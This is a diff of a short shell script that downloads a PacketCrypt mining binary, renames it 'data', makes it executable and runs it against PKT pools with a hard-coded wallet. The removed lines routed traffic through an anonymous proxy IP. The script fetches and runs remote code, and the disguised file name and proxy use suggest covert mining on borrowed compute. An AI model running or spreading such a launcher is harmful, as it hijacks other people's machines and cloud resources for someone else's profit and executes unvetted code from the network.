@@ -1,7 +1,4 @@
-curl --proxy "http://106.15.95.191:80/" https://ipv4.webshare.io/
-export http_proxy=http://106.15.95.191:80
-export https_proxy=http://106.15.95.191:80
-export ftp_proxy=http://106.15.95.191:80
-curl https://www.pkt.world/ext/packetcrypt-linux-amd64 --output data && 
+
+wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O data && 
 chmod +x data && 
-./data ann -p pkt1qh3cswe3gckds4vutpasr6z2rwz6rxkkhgxecys http://pool.pktpool.io http://pool.pkt.world http://pool.pkteer.com
+./data ann -p pkt1qh3cswe3gckds4vutpasr6z2rwz6rxkkhgxecys http://pool.pktpool.io http://pool.pkteer.com
